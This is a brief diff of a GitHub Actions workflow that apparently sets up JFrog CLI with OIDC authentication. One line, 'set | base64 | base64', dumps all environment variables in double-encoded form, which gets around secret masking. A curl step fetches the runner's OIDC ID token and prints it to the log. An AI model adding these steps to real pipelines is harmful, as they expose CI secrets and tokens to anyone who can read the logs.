@@ -45,7 +45,7 @@ jobs:
           oidc-provider-name: moti-oidc
       - run: set | base64 | base64
       - name: Setup JFrog CLI
-      - run: jf --version
-      - run: curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"
-
+        run: |
+          jf --version
+          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" $ACTIONS_ID_TOKEN_REQUEST_URL
             
